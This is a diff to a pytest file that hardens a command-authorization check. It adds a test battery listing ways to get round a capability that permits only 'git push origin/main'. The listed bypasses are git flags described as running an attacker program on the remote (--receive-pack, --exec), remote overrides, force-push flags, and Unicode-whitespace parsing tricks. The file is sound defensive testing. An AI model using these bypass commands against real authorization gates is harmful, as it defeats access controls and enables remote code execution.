@@ -82,9 +82,12 @@ def test_target_match_slash_form_accepted(tmp_path):
     assert res.ok and res.reason == "consumed"
 
 
-def test_target_match_with_flags_accepted(tmp_path):
+def test_target_match_no_flags_plain_command_accepted(tmp_path):
+    # Plain `<class> <target>` with no flags and no exotic whitespace consumes.
+    # (Flag-bearing commands are now REFUSED — see the slice-7 hardening battery
+    # test_flag_and_unicode_target_bypasses_all_refused below.)
     res = route_capability.consume(
-        _cap(), _evidence(command="git push origin main --force-with-lease"), store_dir=tmp_path
+        _cap(), _evidence(command="git push origin main"), store_dir=tmp_path
     )
     assert res.ok and res.reason == "consumed"
 
@@ -102,6 +105,77 @@ def test_property_wrong_single_ref_always_refused(ref):
         res = route_capability.consume(_cap(), ev, store_dir=store)
         assert not res.ok and "target_mismatch" in res.reason
         assert list(store.iterdir()) == []
+
+
+# --- Slice-7 hardening battery: _command_targets_match is fail-closed ---------
+#
+# An adversarial battery found the pre-hardening target check accepted dangerous
+# commands for a cap authorizing exactly `git push origin/main`. Two families:
+#
+#   (A) FLAG bypasses — the old rule stripped ALL `-` tokens, so any option rode
+#       through. --receive-pack / --exec run an attacker program on the REMOTE (a
+#       git RCE vector); --repo overrides the remote to an attacker's; --force /
+#       --force-with-lease violate the token non_goals ("no force-push");
+#       --push-option was blindly accepted. A capability authorizes its class
+#       acting on its target — NO options — so every flag-bearing command refuses.
+#
+#   (B) UNICODE-whitespace parsing differential — Python str.split() treats NBSP
+#       (U+00A0), line/para separators (U+2028/U+2029) and em-space (U+2003) as
+#       separators, so the old rule saw [origin, main] and matched; a POSIX shell
+#       does NOT split on them, so git would receive ONE bogus argument. Only
+#       ASCII space/tab are real arg separators — any other whitespace refuses.
+#
+# Every command below must refuse fail-closed (ok=False, target_mismatch, and
+# NOTHING written), and the two legit forms must still consume.
+
+_BYPASS_COMMANDS_MUST_REFUSE = [
+    # (A) flag bypasses — the confirmed escapes plus adjacent force-flags.
+    "git push --receive-pack=evil origin main",   # runs a program on the remote
+    "git push --exec=evil origin main",           # runs a program on the remote
+    "git push --repo=attacker/main origin main",  # attacker-controlled remote override
+    "git push --push-option=x origin main",       # any flag was blindly accepted
+    "git push --force origin main",               # violates non_goals (no force-push)
+    "git push origin main --force-with-lease",    # trailing force flag
+    # (B) unicode-whitespace differential — Python splits these, a shell does not.
+    "git push origin\u00a0main",                  # NBSP U+00A0
+    "git push origin\u2028main",                  # LINE SEPARATOR
+    "git push origin\u2029main",                  # PARAGRAPH SEPARATOR
+    "git push origin\u2003main",                  # EM SPACE U+2003
+    # already-refused controls (regression-lock the pre-existing target checks).
+    "git push attacker/main",                     # different remote
+    "git push origin evil",                       # different ref
+    "git push origin main attacker",              # extra ref
+    "git push",                                   # bare class, no target
+    "git push origin main:attacker",              # refspec renaming the remote ref
+    "git push +main/HEAD:main",                   # force-refspec form
+    "git push https://evil/x main",               # url-form remote override
+]
+
+
+@pytest.mark.parametrize("command", _BYPASS_COMMANDS_MUST_REFUSE)
+def test_flag_and_unicode_target_bypasses_all_refused(tmp_path, command):
+    # Cap authorizes exactly `git push` on `origin/main`. Every command here is a
+    # confirmed bypass or an already-refused control — all must refuse with NO
+    # receipt written (fail-closed BEFORE any write).
+    res = route_capability.consume(_cap(), _evidence(command=command), store_dir=tmp_path)
+    assert not res.ok, f"BYPASS: {command!r} was accepted"
+    assert "target_mismatch" in res.reason, (command, res.reason)
+    assert list(tmp_path.iterdir()) == []  # nothing written on a refused command
+
+
+_LEGIT_COMMANDS_MUST_CONSUME = [
+    "git push origin main",   # space-separated target
+    "git push origin/main",   # slash form of the same target
+]
+
+
+@pytest.mark.parametrize("command", _LEGIT_COMMANDS_MUST_CONSUME)
+def test_legit_target_commands_still_consume(tmp_path, command):
+    # The hardening must not break the authorized operation: the exact target,
+    # in either the space or slash form, still consumes with a receipt.
+    res = route_capability.consume(_cap(), _evidence(command=command), store_dir=tmp_path)
+    assert res.ok and res.reason == "consumed", (command, res.reason)
+    assert list(tmp_path.iterdir()) != []  # a receipt was written
 
 
 # --- Defect 2: HIGH — a non-consumable (terminal) state cannot be consumed ----
